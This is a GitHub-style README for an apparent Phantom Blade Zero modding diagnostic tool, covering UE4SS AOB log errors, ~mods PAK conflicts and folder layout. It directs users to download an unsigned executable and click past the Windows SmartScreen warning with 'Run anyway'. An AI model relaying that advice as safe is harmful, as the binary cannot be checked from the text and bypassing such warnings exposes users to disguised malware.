<p align="center">
  <img src="https://i.postimg.cc/yNjbQr5r/banner.png" alt="PBZ UE4SS Loader Check — UE4SS AOB Errors & PAK Mod Troubleshooting for Phantom Blade Zero" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-UE4SS%20%26%20PAK%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-pbz--loader--check--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# PBZ UE4SS Loader Check — UE4SS AOB Errors & PAK Mod Troubleshooting for Phantom Blade Zero

**Mods stopped loading after a Phantom Blade Zero update? Game closes before the main menu or Lua scripts fail silently? Start with the mod loader and folder layout before deleting your entire mod setup.**

PBZ UE4SS Loader Check focuses on a problem that is easy to misdiagnose after a game patch: the mod files are still on disk, but **UE4SS failed to bind game signatures (`GNatives` / `GUObjectArray`)** or a script-replacement `.pak` conflicts with the updated build. A Windows install can also mix files from different UE4SS distributions.

This project is aimed at **Phantom Blade Zero on Windows (Steam)**. It concerns mod-loader logs, UE4SS directory placement, and `~mods` PAK isolation—not game cheats, graphics tuning, or redistributing third-party mod files.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| UE4SS Lua mods stop working after a patch | `UE4SS.log` shows `Was unable to find AOB for 'GNatives'` or `GUObjectArray` | Check `PBZ\platform\steam\ue4ss\UE4SS.log` and match UE4SS build to patch |
| Broken or frozen main menu after update | Outdated script-replacement `.pak` inside `ProjectPBZ\Content\Paks\~mods` | Move paired `.pak` / `.utoc` / `.ucas` files out of `~mods` one by one |
| No `UE4SS.log` generated on startup | Mixed files from incompatible UE4SS forks or wrong install branch | Keep a single UE4SS distribution inside `PBZ\platform\steam\` |
| Mods placed in the wrong PBZ subfolder | UE4SS belongs in `platform\steam\ue4ss` while PAKs go in `ProjectPBZ\Content\Paks\~mods` | Verify directory layout against the expected Steam tree |

## Download for Windows

[**Download PBZLoaderCheck.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/PBZLoaderCheck.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `PBZLoaderCheck.exe`? (Automatic checks in ~2 seconds)

- Finds `PBZ` across all Steam libraries and parses `platform\steam\ue4ss\UE4SS.log` for `GNatives` / `GUObjectArray` AOB errors.
- Lists all installed Lua mod folders in `ue4ss\Mods` and checks `mods.txt` presence.
- Audits `ProjectPBZ\Content\Paks\~mods` and groups paired `.pak`, `.utoc`, and `.ucas` archives.
- Operates strictly read-only without modifying DLLs or game executables.

### Sample Diagnostic Output

```text
[PBZLoaderCheck] Inspecting Phantom Blade Zero UE4SS & ~mods layout...
[OK]   Game Install     : D:\SteamLibrary\steamapps\common\PBZ
[ERROR] UE4SS.log       : Line 18 - Was unable to find AOB for 'GNatives' (Patch 1.0302256 mismatch)
[INFO] ue4ss\Mods       : 4 Lua mod folders detected
[OK]   Content\Paks\~mods: 2 PAK sets (MapMarkers_P.pak + .utoc/.ucas)
```

The release ZIP is named `PBZLoaderCheck.zip`; the Windows executable inside is named `PBZLoaderCheck.exe`.

1. Close Phantom Blade Zero before moving or checking game files.
2. Click **Download PBZLoaderCheck.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `PBZLoaderCheck.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Phantom Blade Zero and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11, a Windows PC Steam installation of Phantom Blade Zero, and access to the game installation directory.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `PBZLoaderCheck.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### UE4SS mods stopped working after a patch

A game update (such as patch `1.0302256`) can shift memory signatures used by UE4SS. Before reinstalling individual Lua scripts, inspect `UE4SS.log` for `Was unable to find AOB for 'GNatives'` or `GUObjectArray`. A loader signature mismatch prevents every UE4SS-dependent mod from initializing.

### Broken or frozen main menu from PAK conflicts

Texture mods, data edits, and script-replacement `.pak` files behave differently across updates. A single outdated `.pak` (along with its paired `.utoc` and `.ucas` files) inside `ProjectPBZ\Content\Paks\~mods` can freeze startup even when UE4SS itself works properly.

### Mixing incompatible UE4SS distributions

Community packages such as *UE4SS for Phantom Blade Zero* and *OFFICIAL UE4SS for PBZ* use distinct DLL and signature layouts. Mixing files from two distributions causes silent startup failures or missing `UE4SS.log` output.

### Mods placed in the wrong PBZ directory

On Steam Windows builds, the game executable and `ue4ss` directory live under `PBZ\platform\steam\`, whereas PAK overrides belong under `PBZ\ProjectPBZ\Content\Paks\~mods`. Placing mods in the wrong branch leaves them invisible to the loader.

## Where Phantom Blade Zero files normally belong

For a standard Windows Steam installation, the game root is located under:

```text
%ProgramFiles(x86)%\Steam\steamapps\common\PBZ\
```

Inside that structure, key files and subdirectories typically look like this:

```text
PBZ\
├── platform\
│   └── steam\
│       ├── PBZ.exe
│       └── ue4ss\
│           ├── UE4SS.log
│           ├── mods.txt
│           └── Mods\
│               └── YourLuaMod\
└── ProjectPBZ\
    └── Content\
        └── Paks\
            └── ~mods\
                └── YourPakMod_P.pak
```

This is an **illustrative layout**, not a guarantee that every mod uses the same loader. Some mods require Mods Menu or a dedicated bridge; always verify the exact author instructions on the mod's original page.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Confirm your Steam game build.** Open **Steam → Library → Phantom Blade Zero → Properties → Updates** and note the current build ID before testing loaders.
2. **Inspect `UE4SS.log` first.** Check `PBZ\platform\steam\ue4ss\UE4SS.log` for `GNatives`, `GUObjectArray`, or initialization errors before touching your `Mods` folder.
3. **Avoid mixing UE4SS packages.** Keep a single consistent UE4SS release; do not overwrite individual DLLs from a different UE4SS fork without backing up first.
4. **Keep `.pak`, `.utoc`, and `.ucas` sets together.** When isolating a PAK mod in `ProjectPBZ\Content\Paks\~mods`, move all paired files for that mod as a unit.
5. **Test one mod at a time.** Boot the unmodded game first, verify UE4SS initializes cleanly, then re-enable mods individually.
6. **Back up `mods.txt` and settings.** Save a dated copy of `ue4ss\Mods` and `mods.txt` in Documents before running Steam's *Verify integrity of game files*.
7. **Restart Phantom Blade Zero cleanly.** Ensure `PBZ.exe` is completely closed in Task Manager before moving DLLs or PAK archives.

### Before moving any files

Create a dated backup folder outside `steamapps` (such as `Documents\PBZ-ModBackup\`) containing your `Mods` directory, `mods.txt`, and `~mods` archives. Never disable Windows Defender or download unverified DLL packs from unofficial mirror sites.

## What an effective diagnostic report should tell you

A useful compatibility check identifies **whether `UE4SS.log` exists**, whether `GNatives` / `GUObjectArray` AOB errors appear in the log, and which Lua or `.pak` folders are active in `ue4ss\Mods` and `~mods`. It separates a loader-level break from an individual outdated mod so you can report exact error lines rather than guessing.

## FAQ

**What does 'Was unable to find AOB for GNatives' mean?**

It means the installed UE4SS signature configuration does not match the current `PBZ.exe` game build. Check for an updated UE4SS build or signature fix targeting your exact patch.

**Where do UE4SS Lua mods go in Phantom Blade Zero?**

Typically inside `PBZ\platform\steam\ue4ss\Mods\`, with the mod registered in `mods.txt` if your UE4SS package uses it.

**Where do PAK mods go in Phantom Blade Zero?**

Most PAK mods go into `PBZ\ProjectPBZ\Content\Paks\~mods\`, unless the mod author specifies a different loader.

**Can this fix an outdated mod automatically?**

No. It diagnoses loader logs and folder structure; mods broken by script changes still require an update from the mod author.

**Will Steam file verification remove my mods?**

Steam's *Verify integrity of game files* restores modified base game files and can overwrite loader hooks, so always back up `ue4ss` and `~mods` first.

**Does this repository include UE4SS or third-party mods?**

No third-party binaries, game assets, or mods are bundled here. Obtain loaders and mods directly from their original creators.

## Useful reading

- [Phantom Blade Zero on Steam](https://store.steampowered.com/app/4115450/Phantom_Blade_Zero/)
- [Phantom Blade Zero on Nexus Mods](https://www.nexusmods.com/phantombladezero)
- [UE4SS for Phantom Blade Zero (Nexus Mods)](https://www.nexusmods.com/phantombladezero/mods/5)

## More Windows Game Diagnostic Tools

- [CP2077-RedModLogInspector](../CP2077-RedModLogInspector) — Cyberpunk 2077 `RED4ext`, CET & `redscript` log inspector
- [MHWilds-ShaderFrameDoctor](../MHWilds-ShaderFrameDoctor) — Monster Hunter Wilds `shader.cache2` & `dinput8.dll` check
- [ReadyOrNot-ModPakCleaner](../ReadyOrNot-ModPakCleaner) — Ready or Not UE5 `~mods` PAK cleaner & corrupt data fix
- [Palworld-WorldSaveSentinel](../Palworld-WorldSaveSentinel) — Palworld `Level.sav` backup & UE4SS / `~mods` check

*Independent community project. Not affiliated with S-GAME, Valve, Steam, or Nexus Mods. All product names and trademarks belong to their respective owners.*
